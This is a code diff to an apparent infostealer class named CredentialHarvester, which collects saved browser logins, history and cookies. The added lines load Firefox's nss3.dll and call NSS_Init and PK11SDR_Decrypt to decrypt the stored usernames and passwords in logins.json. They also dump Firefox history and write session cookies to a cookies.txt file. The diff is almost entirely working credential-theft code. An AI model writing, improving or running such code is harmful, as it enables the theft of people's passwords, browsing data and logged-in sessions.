@@ -397,7 +397,7 @@ class CredentialHarvester:
                         cursor = conn.cursor()
                         cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                         for results in cursor.fetchall():
-                            if not results[0] or not results[1] or not results[2]:
+                            if not results[0] or (not results[1] and not results[2]):
                                 continue
                             url = results[0]
                             login = results[1]
@@ -566,11 +566,11 @@ class CredentialHarvester:
                     return path
 
                 def _process_firefox_browser(self):
-                    """Process Firefox passwords and history from profile directories"""
                     try:
+                        import ctypes
+                        from ctypes import wintypes
                         print("Processing Firefox browser data...")
                         
-                        # Find all Firefox profiles
                         firefox_profiles = []
                         for profile_dir in self.firefox_profile_dirs:
                             if os.path.exists(profile_dir):
@@ -583,11 +583,49 @@ class CredentialHarvester:
                             print("No Firefox profiles found")
                             return
                         
-                        print(f"Found {{len(firefox_profiles)}} Firefox profiles")
+                        # Find nss3.dll
+                        nss_path = None
+                        potential_paths = [
+                            os.path.join(os.environ.get('ProgramFiles', 'C:\\Program Files'), 'Mozilla Firefox', 'nss3.dll'),
+                            os.path.join(os.environ.get('ProgramFiles(x86)', 'C:\\Program Files (x86)'), 'Mozilla Firefox', 'nss3.dll'),
+                        ]
+                        for path in potential_paths:
+                            if os.path.exists(path):
+                                nss_path = path
+                                break
                         
+                        nss = None
+                        if nss_path:
+                            try:
+                                # We need to set the DLL directory to load dependencies of nss3.dll
+                                try:
+                                    os.add_dll_directory(os.path.dirname(nss_path))
+                                except AttributeError:
+                                    # Old Python version
+                                    pass
+                                nss = ctypes.CDLL(nss_path)
+                            except Exception as e:
+                                print(f"Failed to load nss3.dll: {{e}}")
+
+                        # SECItem structure for NSS calls
+                        class SECItem(ctypes.Structure):
+                            _fields_ = [('type', ctypes.c_uint), ('data', ctypes.c_void_p), ('len', ctypes.c_uint)]
+
                         for profile_path in firefox_profiles:
                             print(f"Processing Firefox profile: {{profile_path}}")
                             
+                            # Initialize NSS for this profile
+                            initialized = False
+                            if nss:
+                                try:
+                                    # NSS_Init expects the profile directory path
+                                    if nss.NSS_Init(profile_path.encode('utf-8')) == 0:
+                                        initialized = True
+                                    else:
+                                        print(f"NSS_Init failed for profile: {{profile_path}}")
+                                except Exception as e:
+                                    print(f"Error initializing NSS: {{e}}")
+
                             # Process passwords (logins.json)
                             try:
                                 logins_db = os.path.join(profile_path, 'logins.json')
@@ -596,17 +634,47 @@ class CredentialHarvester:
                                         logins_data = json.load(f)
                                         if 'logins' in logins_data:
                                             for entry in logins_data['logins']:
+                                                enc_user = entry.get('encryptedUsername', '')
+                                                enc_pass = entry.get('encryptedPassword', '')
+                                                
+                                                user = entry.get('username', '')
+                                                password = entry.get('password', '')
+                                                
+                                                # If user/password are empty in logins.json, they are likely in the encrypted fields
+                                                if initialized and nss:
+                                                    # Attempt decryption
+                                                    try:
+                                                        # Decrypt Username
+                                                        decoded_user = base64.b64decode(enc_user)
+                                                        item_in_user = SECItem(0, ctypes.cast(ctypes.create_string_buffer(decoded_user), ctypes.c_void_p), len(decoded_user))
+                                                        item_out_user = SECItem(0, None, 0)
+                                                        if nss.PK11SDR_Decrypt(ctypes.byref(item_in_user), ctypes.byref(item_out_user), None) == 0:
+                                                            user = ctypes.string_at(item_out_user.data, item_out_user.len).decode('utf-8', errors='ignore')
+                                                        
+                                                        # Decrypt Password
+                                                        decoded_pass = base64.b64decode(enc_pass)
+                                                        item_in_pass = SECItem(0, ctypes.cast(ctypes.create_string_buffer(decoded_pass), ctypes.c_void_p), len(decoded_pass))
+                                                        item_out_pass = SECItem(0, None, 0)
+                                                        if nss.PK11SDR_Decrypt(ctypes.byref(item_in_pass), ctypes.byref(item_out_pass), None) == 0:
+                                                            password = ctypes.string_at(item_out_pass.data, item_out_pass.len).decode('utf-8', errors='ignore')
+                                                    except Exception as de:
+                                                        print(f"Decryption error: {{de}}")
+
                                                 self.credentials_data.append({{
                                                     "browser": "firefox",
                                                     "profile": os.path.basename(profile_path),
                                                     "url": entry.get('hostname', ''),
-                                                    "username": entry.get('username', ''),
-                                                    "password": entry.get('password', '')
+                                                    "username": user if user else (enc_user if enc_user else "[Unknown]"),
+                                                    "password": password if password else (enc_pass if enc_pass else "")
                                                 }})
-                                            print(f"Found {{len(logins_data['logins'])}} passwords in Firefox profile")
                             except Exception as e:
                                 print(f"Error processing Firefox logins: {{e}}")
                             
+                            if initialized and nss:
+                                try:
+                                    nss.NSS_Shutdown()
+                                except: pass
+
                             # Process history (places.sqlite)
                             try:
                                 history_db = os.path.join(profile_path, 'places.sqlite')
@@ -616,22 +684,18 @@ class CredentialHarvester:
                                     cursor = conn.cursor()
                                     results = cursor.execute("SELECT url, visit_count, title, last_visit_date FROM moz_places").fetchall()
                                     for res in results:
-                                        url, visit_count, title, last_visit_date = res
                                         self.history_data.append({{
                                             "browser": "firefox",
                                             "profile": os.path.basename(profile_path),
-                                            "url": url or "",
-                                            "visit_count": visit_count or 0,
-                                            "title": title or "",
-                                            "last_visit_time": last_visit_date or 0
+                                            "url": res[0] or "",
+                                            "visit_count": res[1] or 0,
+                                            "title": res[2] or "",
+                                            "last_visit_time": res[3] or 0
                                         }})
-                                    cursor.close()
-                                    conn.close()
-                                    os.remove(temp_db)
-                                    print(f"Found {{len(results)}} history entries in Firefox profile")
+                                    conn.close(); os.remove(temp_db)
                             except Exception as e:
                                 print(f"Error processing Firefox history: {{e}}")
-                            
+
                             # Process cookies (cookies.sqlite)
                             try:
                                 cookies_db = os.path.join(profile_path, 'cookies.sqlite')
@@ -639,24 +703,19 @@ class CredentialHarvester:
                                 if temp_db:
                                     conn = sqlite3.connect(temp_db)
                                     cursor = conn.cursor()
-                                    
                                     cookie_file_path = os.path.join(self.browser_output_dir, "cookies.txt")
                                     with open(cookie_file_path, 'a', encoding="utf-8") as f:
                                         f.write(f"\nBrowser: firefox     Profile: {{os.path.basename(profile_path)}}\n\n")
-                                        for res in cursor.execute("SELECT host, name, path, value, expiry, isSecure, isHttpOnly, sameSite FROM moz_cookies").fetchall():
-                                            host, name, path, value, expiry, is_secure, is_httponly, same_site = res
-                                            if host and name and value:
-                                                f.write(f"{{host}}\t{{'FALSE' if expiry == 0 else 'TRUE'}}\t{{path}}\t{{'FALSE' if host.startswith('.') else 'TRUE'}}\t{{expiry or 0}}\t{{name}}\t{{value}}\n")
-                                    cursor.close()
-                                    conn.close()
-                                    os.remove(temp_db)
+                                        for res in cursor.execute("SELECT host, name, path, value, expiry FROM moz_cookies").fetchall():
+                                            if res[0] and res[1]:
+                                                f.write(f"{{res[0]}}\t{{'FALSE' if res[4] == 0 else 'TRUE'}}\t{{res[2]}}\t{{'FALSE' if res[0].startswith('.') else 'TRUE'}}\t{{res[4] or 0}}\t{{res[1]}}\t{{res[3]}}\n")
+                                    conn.close(); os.remove(temp_db)
                             except Exception as e:
                                 print(f"Error processing Firefox cookies: {{e}}")
                         
-                        print(f"Firefox processing complete. Total credentials: {{len(self.credentials_data)}}, Total history: {{len(self.history_data)}}")
+                        print(f"Firefox processing complete.")
                     except Exception as e:
                         print(f"Error in Firefox browser processing: {{e}}")
-
             # Create Browsers instance to extract data directly
             browsers = Browsers()
 
